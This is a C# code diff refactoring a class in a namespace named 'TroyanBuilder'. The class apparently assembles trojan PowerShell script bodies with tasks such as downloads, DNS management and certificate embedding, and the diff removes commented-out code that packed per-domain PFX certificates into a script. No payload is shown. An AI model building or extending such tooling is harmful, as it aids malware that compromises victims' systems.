@@ -1,65 +1,19 @@
 namespace TroyanBuilder;
 
-public abstract class BodyBuilder: CustomBuilder
+public sealed class BodyBuilder : CustomBuilder
 {
     protected override string SourceDir => L.TroyanScriptDir;
 
-    protected override string[] PriorityTasks => new [] {"startdownloads", "dnsman", "cert" };
-    protected override string[] UnpriorityTasks => new [] {"extraupdate" };
+    protected override string OutputFile => L.BodyPs1;
+
+    protected override string[] PriorityTasks => new[] { "startdownloads", "dnsman", "cert" };
+    protected override string[] UnpriorityTasks => new[] { "extraupdate" };
     protected override string EntryPoint => "program";
 
     protected override void InternalBuild(string server)
     {
-        //MakeCert();
         MakeEmbeddings();
     }
-
-//     private string MakeCert()
-//     {
-//         var template = @"
-//
-//         $xdata = @{
-//         _CERT
-//     }
-//
-// ";
-//
-//         var stringList = new List<string>();
-//
-//         foreach (var domainIp in Model.DomainIps)
-//         {
-//             foreach (var domain in domainIp.Domains)
-//             {
-//                 var pathPfx = PfxFile(domain);
-//                 if (string.IsNullOrEmpty(pathPfx))
-//                 {
-//                     throw new Exception($"The certificate is not found for domain: {domain}");
-//                 }
-//
-//                 var binaryData = File.ReadAllBytes(pathPfx);
-//                 var base64 = CustomCryptor.EncodeBytes(binaryData);
-//                 var chunkSize = 200;
-//                 var chunks = new List<string>();
-//
-//                 for (var i = 0; i < base64.Length; i += chunkSize)
-//                 {
-//                     var chunk = base64.Substring(i, Math.Min(chunkSize, base64.Length - i));
-//                     chunks.Add(chunk);
-//                 }
-//
-//                 var code = "'" + string.Join("'+" + Environment.NewLine + "'", chunks) + "'";
-//                 stringList.Add($"'{domain}'={code}");
-//             }
-//         }
-//
-//         var listString = string.Join(Environment.NewLine, stringList);
-//         template = template.Replace("_CERT", listString);
-//
-//         var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_cert.ps1");
-//         File.WriteAllText(outputPath, template);
-//
-//         return template;
-//     }
 
     private void MakeEmbeddings()
     {
@@ -142,16 +96,6 @@ public abstract class BodyBuilder: CustomBuilder
         var quotedString = string.Join(",", array.Select(item => $"\"{item}\""));
         return quotedString;
     }
-}
-
-public class BodyBuilderDebug : BodyBuilder
-{
-    protected override string OutputFile => L.BodyDebug;
-}
-
-public class BodyBuilderRelease : BodyBuilder
-{
-    protected override string OutputFile => L.BodyRelease;
 
     protected override void PostBuild()
     {
